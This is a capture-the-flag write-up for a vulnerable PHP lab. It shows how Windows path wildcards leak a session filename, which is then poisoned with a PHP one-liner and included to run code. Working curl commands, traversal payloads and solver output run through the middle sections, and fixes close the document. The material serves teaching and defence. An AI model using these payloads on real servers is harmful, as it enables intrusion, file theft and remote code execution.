# 09 — Windows Path Madness — Writeup

## TL;DR

`api.php?op=creatimg&font=...` concatenates user input onto a font directory and
returns a PNG if the file exists, a 404 if it does not. On Windows the three
characters `<`, `>` and `"` reach the kernel as the wildcards `*`, `?` and `.`,
so that 404 becomes a filename oracle. Walk it character by character to recover
the 26-character session id in `C:\xampp\tmp\sess_XXXXXXXXXXXXXXXXXXXXXXXXXX`
(measured: 497-680 oracle queries depending on the id, mean ~600), poison that
session beforehand with `?op=sign`, then feed the
now-known filename to the `?op=tplcache` loader, which `include()`s it and runs
your PHP. Flag: `PHRACK{dos_device_wildcards_leak_your_sessid}`.

## The bug

### Why `<` `>` `"` are wildcards

Win32 paths are not the kernel's native path format. `CreateFileW` and friends
push the string through the DOS-devices parser (`RtlDosPathNameToNtPathName_U`)
and hand the result to the object manager. Filename *matching* in the NT
namespace is done by `RtlIsNameInExpression`, which understands five wildcard
codes. Three of them are characters that no filesystem will let you *store*:

| character | NT name | behaviour |
|---|---|---|
| `<` | `DOS_STAR` | like `*` |
| `>` | `DOS_QM` | like `?` |
| `"` | `DOS_DOT` | matches a literal `.` |

They exist for MS-DOS backward compatibility (`dir *.*` semantics, where `*.*`
had to match names with no extension). Because `CreateFile` rejects them as
*creation* names but `FindFirstFile` expands them as *search* names, and because
PHP on Windows does no filtering of its own, any PHP function that ends up
asking Windows "does this path exist?" — `file_exists()`, `is_file()`,
`fopen()`, `include` with a warning you can see, `getimagesize()`, `imagettftext`
with a missing font... — becomes a pattern-matching primitive.

This was documented by the USH.it team in 2009 and by Vorontsov & Gerkis in the
ONsec whitepaper, and it stayed exploitable for well over a decade because it is
not a PHP bug — it is Windows doing what Windows promised in 1983.

### The vulnerable app

`challenge/src/api.php`, the oracle:

```php
case 'creatimg':
    $txt  = (string) ($_GET['txt']  ?? 'phpcms');
    $font = (string) ($_GET['font'] ?? 'default.ttf');

    if (!WinPath::exists(FONT_DIR . $font)) {   // on Windows: file_exists()
        http_response_code(404);
        exit("font not found\n");
    }
    header('Content-Type: image/png');
    exit(cms_png($txt));
```

`FONT_DIR` is `C:\xampp\htdocs\statics\fonts\`. There is no `basename()`, no
allow-list, no realpath check. This is the exact shape of the PHPCMS
`api.php?op=creatimg` endpoint that got hammered in Chinese CTFs and in the
wild; DedeCMS had the same primitive and it was used to locate the randomly
named admin directory.

The read primitive, which *is* filtered:

```php
case 'tplcache':
    $tpl = (string) ($_GET['tpl'] ?? '');
    if (!preg_match('/\A[A-Za-z0-9_]{1,64}\z/', $tpl)) {
        http_response_code(400);
        exit("bad template name\n");
    }
    $real = WinPath::resolve(TMP_DIR . $tpl);
    ...
    include $real;
```

No traversal, no dots, no wildcards — but `C:\xampp\tmp` is also the session
save path, which is the default on a XAMPP box. If you know the session
filename, you can include it.

And the write primitive:

```php
case 'sign':
    $_SESSION['visitor'] = (string) ($_GET['name'] ?? '');
```

PHP's default `php` session serialiser writes `key|serialized_value` as raw
bytes, so `$_SESSION['visitor']` lands on disk verbatim. Nothing escapes `<`.

### Why you cannot just read your own session id

`php.ini` in this lab sets `session.use_cookies = 0`, and `cms_session_start()`
calls `session_id(getenv('CMS_BOOK_SID'))` before `session_start()`. Every
anonymous visitor shares one server-side "visitor book" session whose id is
drawn from `random_int()` at container boot and lives only in the Apache process
environment. Nothing in the application ever prints it. It is a 26-character
string over a 32-character alphabet: 130 bits. You are not guessing that.

## Building the exploit

### Step 1 — confirm the oracle

```sh
$ curl -s -o /dev/null -w '%{http_code}\n' \
    'http://127.0.0.1:8009/api.php?op=creatimg&txt=x&font=default.ttf'
200
$ curl -s -o /dev/null -w '%{http_code}\n' \
    'http://127.0.0.1:8009/api.php?op=creatimg&txt=x&font=nope.ttf'
404
```

Case insensitivity and trailing-dot stripping come for free, and are a nice
tell that you are talking to a Windows filesystem:

```sh
$ curl ... 'font=DEFAULT.TTF'      # 200
$ curl ... 'font=default.ttf...'   # 200
$ curl ... 'font=default.ttf%20%20'# 200
```

### Step 2 — reach the session directory

`C:\xampp\htdocs\statics\fonts\` + `..\..\..\tmp\` = `C:\xampp\tmp\`.
`/` and `\` are interchangeable, so URL-encoding is easy:

```sh
$ curl -s -o /dev/null -w '%{http_code}\n' \
    'http://127.0.0.1:8009/api.php?op=creatimg&txt=x&font=..%2F..%2F..%2Ftmp%2Fsess_%3C'
200
```

`%3C` is `<`. A 200 means "there is at least one file called `sess_*` in
`C:\xampp\tmp`".

### Step 3 — walk the id

```sh
$ ... 'font=../../../tmp/sess_a<'   -> 404
$ ... 'font=../../../tmp/sess_b<'   -> 404
...
$ ... 'font=../../../tmp/sess_m<'   -> 200      # first character is 'm'
$ ... 'font=../../../tmp/sess_m0<'  -> 404
$ ... 'font=../../../tmp/sess_mh<'  -> 200      # second character is 'h'
```

This box's session id alphabet is `0123456789abcdefghijklmnopqrstuv`, 32
symbols, and the id is 26 characters long. That comes from
`session.sid_bits_per_character = 5` and `session.sid_length = 26`, which
`challenge/Dockerfile` sets explicitly. Those two values are what
`php.ini-production` (and `php.ini-development`) *recommend*; they are **not**
PHP's compiled-in defaults, which are `sid_bits_per_character = 4` and
`sid_length = 32`, i.e. 32 hexadecimal characters:

```sh
$ docker run --rm php:7.4.33-cli php -r 'printf("%s %s\n",
      ini_get("session.sid_length"), ini_get("session.sid_bits_per_character"));'
32 4
$ docker run --rm php:7.4.33-cli php -r 'session_save_path("/tmp"); session_start();
      echo session_id(), "\n";'
840f70543308139c716bc7b6f23195da        # 32 hex characters, different every run
```

A hex alphabet would be *easier* to walk (16 candidates per position, not 32),
so the lab picks the harder of the two.

### What it costs

Worst case a sequential walk is 32 * 26 = 832 probes and ~16.5 per position on
average, i.e. ~430 — but 32 round trips per position. Every probe is an
independent GET, so the solver runs `WORKERS = 12` of them at a time. That caps
each position at 3 round trips, and it costs requests, because `pool.map` is
eager: a batch of 12 is always issued in full, even when the answer is its
first element. A 32-symbol alphabet splits into batches of 12, 12 and 8, so the
hit character costs 12, 24 or 32 probes depending on which batch it lands in,
with probability 12/32, 12/32 and 8/32:

```
E[probes per position] = (12*12 + 12*24 + 8*32) / 32 = 688 / 32 = 21.5
```

so `26 * 21.5 = 559`, plus a final 32-probe sweep that finds no continuation
and ends the loop, plus 4 probes of setup — **~595 expected**.

Measured, six clean runs against this lab (`docker compose down -v` between
each, so the id is freshly random every time):

```
497  571  613  616  638  680     oracle queries   (mean 602, sd ~60)
499  573  615  618  640  682     HTTP requests in total
```

The spread is not noise in the lab, it is the id: the total is the sum of 26
independent draws from that {12, 24, 32} distribution, whose standard deviation
is `sqrt(26) * 8.0 = 41`, so a ±100 swing either side of 595 is ordinary. In-process wall clock is
**1.8 s** (`time python solve.py` inside the solver container; the extra ~0.5 s
of `make solve` is `docker compose run` starting the container).

An earlier revision of this writeup claimed "~500 requests" and a sample run of
"512 oracle queries / 516 total". Neither was measured: 500 is roughly what a
*sequential* stop-at-first-hit search would cost, and the "total" line was
computing `oracle_queries + 3` when the real total is one more request than the
oracle count, not three. Both the solver's accounting and the numbers here are
now measured.

`>` (i.e. `?`) is useful too: `sess_>>>>>>>>>>>>>>>>>>>>>>>>>>` confirms the id
is exactly 26 characters before you start, and lets you test a character at a
fixed offset without knowing the prefix.

### Step 4 — poison, then include

Do this *before* the brute force so the session file is populated (any request
touching the session recreates it):

```sh
$ curl -sG --data-urlencode "name=<?php echo file_get_contents('/flag.txt'); ?>" \
    'http://127.0.0.1:8009/api.php?op=sign'
signed, thanks!
```

On disk, `C:\xampp\tmp\sess_mh18a8gf46a22816fgrrave69v` now holds:

```
visitor|s:45:"<?php echo file_get_contents('/flag.txt'); ?>";
```

Then:

```sh
$ curl -s 'http://127.0.0.1:8009/api.php?op=tplcache&tpl=sess_mh18a8gf46a22816fgrrave69v'
visitor|s:45:"PHRACK{dos_device_wildcards_leak_your_sessid}
";
```

`include` echoes the non-PHP bytes and executes the tag. The `s:45:` length
prefix is now a lie, but nobody is unserialising this file — we are executing
it.

### Bonus — `::$INDEX_ALLOCATION`

`?op=cachewrite` is not needed for the flag; it exists so you can play with the
ADS behaviour. Its target directory, `C:\xampp\caches\`, sits *outside* the
document root on purpose — otherwise writing `shell.php` there would short-cut
the whole lab:

```sh
$ curl -s 'http://127.0.0.1:8009/api.php?op=cachewrite&name=plugin::$INDEX_ALLOCATION&data=x'
write failed
$ docker compose exec challenge ls -la /xampp/caches
drwxr-xr-x 2 www-data www-data 4096 plugin
```

The write fails, and the directory exists anyway. `$INDEX_ALLOCATION` is the
NTFS attribute that stores a directory's B-tree index; asking to create that
stream on a new name forces NTFS to materialise the object as a directory. That
is how `SELECT 1 INTO OUTFILE 'C:\MySQL\lib\plugin::$INDEX_ALLOCATION'` recreates
the missing `plugin` directory and revives the MySQL UDF chain — an arbitrary
file *write* promoted to an arbitrary `mkdir`.

## The exploit

`solve/solve.py`, stdlib only. Stages:

1. `poison()` — `GET /api.php?op=sign&name=<?php echo file_get_contents('/flag.txt'); ?>`.
2. Sanity check that `default.ttf` gives 200 and `nope.ttf` gives 404, so we
   know the oracle is the oracle.
3. `sess_exists("sess_<")` to confirm there is something to find.
4. `brute_sid()` — for every position, probe the 32-symbol alphabet in batches
   of 12 threads (each thread keeps its own keep-alive `HTTPConnection`) and
   keep the first character that returns 200. Stop when no character extends
   the prefix — that final full sweep of the alphabet is 32 of the ~600
   requests.
5. Re-probe the full name *without* a wildcard, as a self-check.
6. `GET /api.php?op=tplcache&tpl=sess_<sid>` and regex the flag out.

Output:

```
[*] target http://challenge
[+] visitor book signed with a PHP one-liner
[+] oracle works (200 = found, 404 = not found)
[+] at least one session file exists in C:\xampp\tmp\
[*] char  1 = 'u'   sess_u
...
[*] char 26 = 'o'   sess_urrmegsqfkhelluot0v1f221lo
[+] session file: C:\xampp\tmp\sess_urrmegsqfkhelluot0v1f221lo  (616 oracle queries)
[+] included the session file, 62 bytes back
[*] 616 oracle queries, 618 HTTP requests total
FLAG: PHRACK{dos_device_wildcards_leak_your_sessid}
```

(That is one real run. The count moves with the random id — see "What it
costs" above for the measured range.)

## Fixing it

1. **Never concatenate request data into a path.** Map the `font` parameter
   through an allow-list:

   ```php
   $fonts = ['default' => 'default.ttf', 'mono' => 'dejavu-mono.ttf'];
   $font  = $fonts[$_GET['font'] ?? 'default'] ?? null;
   if ($font === null) { http_response_code(400); exit; }
   ```

2. If you really must accept a filename, `basename()` it *and* reject anything
   outside `[A-Za-z0-9._-]`. On Windows, explicitly reject `< > " | ? *` and
   `:` — `basename()` alone does not remove them, and `realpath()` on a
   wildcard path returns the *matched* file, so it will not save you either.

3. Do not leak the answer through the status code. A missing font should render
   a default font, not a 404. Removing the observable difference removes the
   oracle even if the path handling stays broken.

4. Keep the session save path out of every include/read path. `open_basedir`,
   a dedicated `session.save_path` outside the web tree, or better,
   `session.save_handler = redis`.

5. Treat `$_SESSION` contents as untrusted when they can be reached as a file.
   `session.serialize_handler = php_serialize` does not help; not being able to
   `include` the file does.

6. `open_basedir` is worth setting, but do not rely on it here: it constrains
   the *prefix* of the path PHP is about to open, so it stops the traversal out
   of the fonts directory — it does nothing about wildcard characters inside an
   allowed directory, and the oracle still works there.

## Going further

* Use `>` (DOS_QM) to binary-search a name from the *end*: `sess_>>>...>>v`
  tests the last character without knowing the middle.
* The same oracle finds backup files (`backup_<"sql`), the DedeCMS randomised
  admin directory (`dede<`), `.git` directories, and installer leftovers.
* Chain it the other way round: no session poisoning, just an oracle over
  `C:\Windows\Temp\` or `C:\Users\<` for username enumeration.
* WorstFit (Orange Tsai & splitline, 2025) is the modern descendant: Windows'
  Best-Fit ANSI conversion turns characters like `＜` (U+FF1C) into `<` *after*
  your filter has run.
* On a real box, `::$DATA` appended to a `.php` path used to make IIS/PHP serve
  the source instead of executing it — same family of bug, different stream.

## References

* Phrack #72, Orange Tsai, *"The Art of PHP - My CTF Journey and Untold
  Stories!"*, section 3.1 "Windows Path Madness".
* Giovanni Pellerano, Antonio Parata, Francesco Ongaro, Alessandro Tanasi,
  *"PHP filesystem attack vectors - Take Two"*,
  https://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/
* Vladimir Vorontsov, Arthur Gerkis, *"Oddities of PHP file access in
  Windows"*, ONsec whitepaper, http://onsec.ru/onsec.whitepaper-02.eng.pdf
  (archived).
* *"PHPCMSv9 逻辑漏洞导致备份文件名可猜测"* — backup filename guessing in PHPCMS v9.
* *"解决DEDECMS历史难题--找后台目录"*, https://xz.aliyun.com/news/1765 — finding the
  DedeCMS admin directory.
* Soroush Dalili, *"A Dotty Salty Directory: A Secret Place in NTFS for Secret
  Files!"*,
  https://soroush.me/blog/2010/12/a-dotty-salty-directory-a-secret-place-in-ntfs-for-secret-files/
* Orange Tsai & Splitline NG, *"WorstFit: Unveiling Hidden Transformers in
  Windows ANSI!"*,
  https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/
* Microsoft, *"Naming Files, Paths, and Namespaces"* and
  `RtlIsNameInExpression` documentation, for the DOS_STAR / DOS_QM / DOS_DOT
  matching rules.
